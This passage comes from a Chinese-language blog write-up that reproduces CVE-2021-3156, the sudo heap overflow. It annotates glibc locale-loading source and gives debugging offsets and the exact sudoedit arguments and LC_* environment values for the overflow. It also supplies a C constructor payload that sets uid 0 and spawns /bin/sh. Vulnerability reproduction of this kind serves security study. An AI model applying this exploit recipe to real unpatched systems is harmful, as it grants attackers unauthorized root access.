operator">||</span> do_allocate <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">free</span> <span class="token punctuation">(</span>abs_filename<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> retval<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  retval <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> loaded_l10nfile <span class="token operator">*</span><span class="token punctuation">)</span>    <span class="token function">malloc</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token operator">*</span>retval<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">__argz_count</span> <span class="token punctuation">(</span>dirlist<span class="token punctuation">,</span> dirlist_len<span class="token punctuation">)</span>                <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token function">pop</span> <span class="token punctuation">(</span>mask<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token operator">*</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> loaded_l10nfile <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>retval <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">free</span> <span class="token punctuation">(</span>abs_filename<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  retval<span class="token operator">-></span>filename <span class="token operator">=</span> abs_filename<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* If more than one directory is in the list this is a pseudo-entry     which just references others.  We do not try to load data for it,     ever.  */</span>  retval<span class="token operator">-></span>decided <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">__argz_count</span> <span class="token punctuation">(</span>dirlist<span class="token punctuation">,</span> dirlist_len<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span>             <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mask <span class="token operator">&amp;</span> XPG_CODESET<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>             <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>mask <span class="token operator">&amp;</span> XPG_NORM_CODESET<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  retval<span class="token operator">-></span>data <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>last <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      retval<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token operator">*</span>l10nfile_list<span class="token punctuation">;</span>      <span class="token operator">*</span>l10nfile_list <span class="token operator">=</span> retval<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">else</span>    <span class="token punctuation">{</span>      retval<span class="token operator">-></span>next <span class="token operator">=</span> last<span class="token operator">-></span>next<span class="token punctuation">;</span>      last<span class="token operator">-></span>next <span class="token operator">=</span> retval<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  entries <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* If the DIRLIST is a real list the RETVAL entry corresponds not to     a real file.  So we have to use the DIRLIST separation mechanism     of the inner loop.  */</span>  <span class="token comment" spellcheck="true">//这里会进行递归的搜索，根据mask 来讲所有的组合全部找到</span>  <span class="token comment" spellcheck="true">//每次mask 值会-1，这样遍历所有mask可能</span>  cnt <span class="token operator">=</span> <span class="token function">__argz_count</span> <span class="token punctuation">(</span>dirlist<span class="token punctuation">,</span> dirlist_len<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> mask <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">:</span> mask<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> cnt <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>cnt<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>cnt <span class="token operator">&amp;</span> <span class="token operator">~</span>mask<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/* Iterate over all elements of the DIRLIST.  */</span>    <span class="token keyword">char</span> <span class="token operator">*</span>dir <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>dir <span class="token operator">=</span> <span class="token function">__argz_next</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> dirlist<span class="token punctuation">,</span> dirlist_len<span class="token punctuation">,</span> dir<span class="token punctuation">)</span><span class="token punctuation">)</span>           <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>      retval<span class="token operator">-></span>successor<span class="token punctuation">[</span>entries<span class="token operator">++</span><span class="token punctuation">]</span>        <span class="token operator">=</span> <span class="token function">_nl_make_l10nflist</span> <span class="token punctuation">(</span>l10nfile_list<span class="token punctuation">,</span> dir<span class="token punctuation">,</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>dir<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> cnt<span class="token punctuation">,</span>                  language<span class="token punctuation">,</span> territory<span class="token punctuation">,</span> codeset<span class="token punctuation">,</span>                  normalized_codeset<span class="token punctuation">,</span> modifier<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  retval<span class="token operator">-></span>successor<span class="token punctuation">[</span>entries<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> retval<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>在setlocale函数之前的tcachebins<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305211918769.png"><br>setlocale分配+释放堆块之后的tcachebins.可以看到我们已经为堆块3、5、7和vuln_chunk准备好了空间.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305211918515.png"></p><p>把断点下在溢出点之前,上方为vuln_chunk,下面的地址是堆块7的地址.<br>所需的填充数据长度为0x5606de431000-0x5606de4309b0=0x650<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305211918140.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305211925259.png"></p><blockquote><p>可以将输入参数总共0xa0 分成两个部分 x 个\ (每个是一个独立字符串，占两个字节) 和一个’a’ * y (y个字符a是一个字符串，占y+1字节)<br>//每一次遍历都会溢出后面所有的字符,后一次比前一次少溢出1字节,等差数列求和<br>(x+y)+(x+2y+1)·x/2=0x650<br>    2x+y = 0x90</p></blockquote><p>解得x=11,y=121</p><h4 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h4><p>至此我们以完成了所有的利用分析.<br>设置参数列表为:sudoedit -s \ \ \ …(11个)… \ “aaaa…(121个)…aaa”  \…(4个)<br>设置环境变量为:<br>\(133个)<br>X/test<br>LC_IDENTIFICATION=C.UTF-8@ + “A”…(33个),<br>LC_MEASUREMENT=C.UTF-8@ + “A”…(33个)<br>LC_TELEPHONE=C.UTF-8@+”A”…(129个)<br>LC_ADDRESS=C.UTF-8@ + “A”…(33个).<br>LC_NAME=xxxxxxxxxxxxxxxxxxxxx(这个仅仅用来使_nl_find_locale函数返回空值从而终止循环查找环境变量)</p><p>据此设置环境变量和参数,最终成功劫持name指针指向X/test字符串.程序会自动装载./libnss_X/test.so.2路径的伪造文件<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305211952852.png"><br>我们在该文件中用attribute宏声明函数,会在加载库时自动执行该函数,完成提权.</p><pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">seteuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">setegid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>a_argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>a_envp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">"PATH=/bin:/usr/bin:/sbin"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token function">execv</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> a_argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="对Linux提权的补充"><a href="#对Linux提权的补充" class="headerlink" title="对Linux提权的补充"></a>对Linux提权的补充</h3><p>使用ls /bin/sudo -al查看sudo命令的权限,可以看到owner是root用户,权限为rws,s代表setuid标志(ls目录显示时的红色背景色便是表示这一标志).一个可执行文件在执行时，一般该程序只拥有调用该程序的用户具有的权限，而 setuid会set一个process的euid为这个可执行文件或程序的拥有者(比如root)的uid.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305211959496.png"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://kiprey.github.io/2021/01/CVE-2021-3156/">https://kiprey.github.io/2021/01/CVE-2021-3156/</a><br><a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</a><br><a href="https://github.com/chenaotian/CVE-2021-3156">https://github.com/chenaotian/CVE-2021-3156</a></p>]]></content>
      
      
      <categories>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
